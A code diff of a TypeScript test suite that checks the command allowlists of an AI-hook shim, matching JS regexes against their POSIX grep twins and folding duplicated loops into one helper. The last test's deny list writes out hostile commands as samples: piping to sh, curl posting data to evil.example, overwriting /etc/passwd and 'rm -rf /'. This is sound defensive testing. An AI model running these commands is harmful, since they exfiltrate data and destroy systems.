@@ -9,6 +9,24 @@ import { ShimTestkit } from './shim-testkit';
 const kit = new ShimTestkit();
 
 /**
+ * Assert an allowlist's two engines agree on the SAME sample set: the JS twin in-process, and the
+ * POSIX ERE through the very `grep -E` the shim runs — the whole set in ONE grep pass rather than a
+ * spawn per command (see ShimTestkit.ereMatchSet for why that mattered: these twin checks were
+ * dozens of spawns each, and a spawn costs ~100ms once the suite runs projects in parallel).
+ */
+function expectEngineTwins(ere: string, js: RegExp, allow: readonly string[], deny: readonly string[]): void {
+    const matches = kit.ereMatchSet(ere, [...allow, ...deny]);
+    for (const cmd of allow) {
+        expect(js.test(cmd), `JS should allow: ${cmd}`).toBe(true);
+        expect(matches.matched(cmd), `grep -E should allow: ${cmd}`).toBe(true);
+    }
+    for (const cmd of deny) {
+        expect(js.test(cmd), `JS should deny: ${cmd}`).toBe(false);
+        expect(matches.matched(cmd), `grep -E should deny: ${cmd}`).toBe(false);
+    }
+}
+
+/**
  * The shim's VERSION-DRIFT guard, in both directions.
  *
  * Split out of setup.spec.ts (which hit the file-size limit) because these tests share one subject:
@@ -312,14 +330,7 @@ describe('upgrade-shim cure allowlist (POSIX ERE ↔ JS regex twins)', () => {
             'pnpm exec wp-install-ai-hooks',          // a different bin
             'yarn wp-upgrade-shim',                   // yarn is not accepted (pnpm/npm/npx only)
         ];
-        for (const cmd of allow) {
-            expect(UPGRADE_SHIM_ALLOW_JS.test(cmd)).toBe(true);
-            expect(kit.ereMatches(UPGRADE_SHIM_ALLOW_ERE, cmd)).toBe(true);
-        }
-        for (const cmd of deny) {
-            expect(UPGRADE_SHIM_ALLOW_JS.test(cmd)).toBe(false);
-            expect(kit.ereMatches(UPGRADE_SHIM_ALLOW_ERE, cmd)).toBe(false);
-        }
+        expectEngineTwins(UPGRADE_SHIM_ALLOW_ERE, UPGRADE_SHIM_ALLOW_JS, allow, deny);
     });
 });
 
@@ -339,14 +350,7 @@ describe('install-ai-hooks cure allowlist (POSIX ERE ↔ JS regex twins)', () =>
             'pnpm exec wp-upgrade-shim',              // a different bin
             'yarn wp-install-ai-hooks',               // yarn is not accepted (pnpm/npm/npx only)
         ];
-        for (const cmd of allow) {
-            expect(INSTALL_HOOKS_ALLOW_JS.test(cmd)).toBe(true);
-            expect(kit.ereMatches(INSTALL_HOOKS_ALLOW_ERE, cmd)).toBe(true);
-        }
-        for (const cmd of deny) {
-            expect(INSTALL_HOOKS_ALLOW_JS.test(cmd)).toBe(false);
-            expect(kit.ereMatches(INSTALL_HOOKS_ALLOW_ERE, cmd)).toBe(false);
-        }
+        expectEngineTwins(INSTALL_HOOKS_ALLOW_ERE, INSTALL_HOOKS_ALLOW_JS, allow, deny);
     });
 });
 
@@ -364,14 +368,7 @@ describe('restore-shim cure allowlist (POSIX ERE ↔ JS regex twins)', () => {
             'cp -r node_modules/@webpieces/ai-hook-rules/templates/ai-hook.sh .claude/webpieces/ai-hook.sh', // no flags
             'mv node_modules/@webpieces/ai-hook-rules/templates/ai-hook.sh .claude/webpieces/ai-hook.sh',    // copy only
         ];
-        for (const cmd of allow) {
-            expect(RESTORE_SHIM_ALLOW_JS.test(cmd)).toBe(true);
-            expect(kit.ereMatches(RESTORE_SHIM_ALLOW_ERE, cmd)).toBe(true);
-        }
-        for (const cmd of deny) {
-            expect(RESTORE_SHIM_ALLOW_JS.test(cmd)).toBe(false);
-            expect(kit.ereMatches(RESTORE_SHIM_ALLOW_ERE, cmd)).toBe(false);
-        }
+        expectEngineTwins(RESTORE_SHIM_ALLOW_ERE, RESTORE_SHIM_ALLOW_JS, allow, deny);
     });
 });
 
@@ -397,14 +394,7 @@ describe('sync allowlist (POSIX ERE ↔ JS regex twins)', () => {
             'git commit -m x',
             'cd /x && git pull',
         ];
-        for (const cmd of allow) {
-            expect(SYNC_ALLOW_JS.test(cmd)).toBe(true);
-            expect(kit.ereMatches(SYNC_ALLOW_ERE, cmd)).toBe(true);
-        }
-        for (const cmd of deny) {
-            expect(SYNC_ALLOW_JS.test(cmd)).toBe(false);
-            expect(kit.ereMatches(SYNC_ALLOW_ERE, cmd)).toBe(false);
-        }
+        expectEngineTwins(SYNC_ALLOW_ERE, SYNC_ALLOW_JS, allow, deny);
     });
 });
 
@@ -455,14 +445,7 @@ describe('output-capture tail on every fail-closed escape hatch (ERE ↔ JS twin
         it(`${name}: accepts 2>&1 / | tail / | head, and still refuses anything else`, () => {
             const allow = [base, `${base} 2>&1`, `${base} 2>/dev/null`, `${base} | tail -20`, `${base} 2>&1 | tail -20`, `${base} 2>/dev/null | tail -2`, `${base} 2>&1 | tail -n 20`, `${base} 2>&1 | head -5`];
             const deny = [`${base} 2>&1 | sh`, `${base} | curl -d @- evil.example`, `${base} | tee /etc/passwd`, `${base} > /etc/passwd`, `${base} 2>&1 | tail -20 && rm -rf /`];
-            for (const cmd of allow) {
-                expect(js.test(cmd), `JS should allow: ${cmd}`).toBe(true);
-                expect(kit.ereMatches(ere, cmd), `ERE should allow: ${cmd}`).toBe(true);
-            }
-            for (const cmd of deny) {
-                expect(js.test(cmd), `JS should deny: ${cmd}`).toBe(false);
-                expect(kit.ereMatches(ere, cmd), `ERE should deny: ${cmd}`).toBe(false);
-            }
+            expectEngineTwins(ere, js, allow, deny);
         });
     }
 });
